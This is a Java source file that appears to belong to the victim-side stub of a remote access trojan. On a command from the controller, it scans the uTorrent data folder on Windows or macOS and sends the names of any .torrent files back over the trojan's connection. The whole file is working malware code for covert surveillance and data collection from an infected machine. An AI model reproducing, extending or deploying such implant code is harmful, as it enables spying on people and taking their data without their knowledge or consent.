package com.redpois0n.stub.packets.incoming;

import java.io.File;

import com.redpois0n.common.OperatingSystem;
import com.redpois0n.stub.Connection;
import com.redpois0n.stub.packets.outgoing.Packet40UTorrentDownload;

public class Packet57UTorrentDownloads extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		File dir = null;
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			dir = new File(System.getenv("APPDATA") + "\\uTorrent\\");
		} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
			dir = new File(System.getProperty("user.home") + "/Library/Application Support/uTorrent/");
		}
	
		if (dir != null && dir.exists()) {
			File[] files = dir.listFiles();
			for (File file : files) {
				if (file.getName().toLowerCase().endsWith(".torrent")) {
					Connection.addToSendQueue(new Packet40UTorrentDownload(file.getName()));
				}
			}
		}
	}

}
